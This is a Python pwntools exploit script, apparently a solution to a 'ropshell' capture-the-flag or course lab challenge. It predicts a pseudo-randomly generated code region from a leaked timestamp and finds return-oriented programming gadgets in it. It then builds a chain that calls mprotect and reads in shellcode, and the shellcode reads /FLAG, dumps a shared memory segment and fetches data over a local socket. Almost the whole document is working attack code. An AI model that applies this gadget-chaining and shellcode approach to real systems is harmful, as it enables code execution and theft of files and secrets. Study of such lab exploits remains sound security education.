#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
import ctypes
libc = ctypes.CDLL('libc.so.6')
import numpy as np
import struct

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'test' in sys.argv[1:]:
    r = process("./test", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

r.recvuntil(b'Timestamp is ')
t = int(r.recvline()[:-1])
r.recvuntil(b'generated at ')
code = int(r.recvline()[:-1], 16)

LEN_CODE = 10*0x10000
LEN_STACK = 8192
codeint = np.zeros(int(LEN_CODE/4), np.uint32)
libc.srand(t)

for i in range(0, int(LEN_CODE/4)):
    codeint[i] = (((libc.rand()<<16) & 0xffffffff) | (libc.rand() & 0xffff))

idx = libc.rand() % (int(LEN_CODE/4) - 1)

s = struct.pack('<{}I'.format(len(codeint)), *codeint)

pop_rdi = asm('''pop rdi 
    ret''')
pop_rsi = asm('''pop rsi 
    ret''')
pop_rdx = asm('''pop rdx 
    ret''')
pop_rax = asm('''pop rax 
    ret''')
pop_sys = asm('''syscall 
    ret''').hex()
mov_rdi_rax = asm('''xchg edi, eax
    ret''')
mov_rdx_rax = asm('''xchg edx, eax 
    ret''')

idx_pop_rdi = s.find(pop_rdi)
idx_pop_rsi = s.find(pop_rsi)
idx_pop_rdx = s.find(pop_rdx)
idx_pop_rax = s.find(pop_rax)
idx_mov_rdi_rax = s.find(mov_rdi_rax)
idx_mov_rdx_rax = s.find(mov_rdx_rax)

tmp = asm('''jmp qword ptr [rax]
    ret''')
# print(tmp.hex())

# print(hex(code))

stack = p64(code+idx_pop_rax) + \
        p64(10) + \
        p64(code+idx_pop_rdi) + \
        p64(code) + \
        p64(code+idx_pop_rsi) + \
        p64(LEN_CODE) + \
        p64(code+idx_pop_rdx) + \
        p64(0b111) + \
        p64(code+idx*4) + \
        p64(code+idx_pop_rax) + \
        p64(0) + \
        p64(code+idx_pop_rdi) + \
        p64(0) + \
        p64(code+idx_pop_rsi) + \
        p64(code) + \
        p64(code+idx_pop_rdx) + \
        p64(LEN_CODE) + \
        p64(code+idx*4) + \
        p64(code)

r.sendafter(b'> ', stack)

shellcode = asm('''
start_shellcode:
    enter   0x90, 0
    lea     rdi, [rip+filename]
    mov     rsi, 0
    mov     rax, 2
    syscall
    mov     rdi, rax
    lea     rsi, [rbp-0x90]
    mov     rdx, 128
    mov     rax, 0
    syscall
    mov     rdx, rax
    mov     rdi, 1
    lea     rsi, [rbp-0x90]
    mov     rax, 1
    syscall
    mov     rdi, 0x1337
    mov     rsi, 0
    mov     rdx, 0
    mov     rax, 29
    syscall
    mov     rdi, rax
    mov     rsi, 0
    mov     rdx, 0x1000
    mov     rax, 30
    syscall
    mov     rsi, rax
    mov     rdi, 1
    mov     rdx, 68
    mov     rax, 1
    syscall
    call    print_newline
    mov     rdi, 2
    mov     rsi, 1
    mov     rdx, 0
    mov     rax, 41
    syscall
    mov     QWORD PTR [rbp-0x4], rax
    mov     WORD PTR [rbp-0x20], 0x2
    mov     WORD PTR [rbp-0x1e], 0x3713
    mov     DWORD PTR [rbp-0x1c],0x100007f
    mov     rdi, QWORD PTR [rbp-0x4]
    lea     rsi, [rbp-0x20]
    mov     rdx, 0x10
    mov     rax, 42
    syscall
    mov     rdi, QWORD PTR [rbp-0x4]
    lea     rsi, [rbp-0x90]
    mov     rdx, 0x50
    mov     r10, 0
    mov     r8, 0
    mov     r9, 0
    mov     rax, 45
    syscall
    mov     rdx, rax
    mov     rdi, 1
    lea     rsi, [rbp-0x90]
    mov     rax, 1
    syscall
    mov     rdi, 37
    mov     rax, 60
    syscall
print_newline:
    mov     rdi, 1
    lea     rsi, [rip+newline]
    mov     rdx, 1
    mov     rax, 1
    syscall
    ret
filename:
    .string "/FLAG"
newline:
    .string "\\n"
''')

r.send(shellcode)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
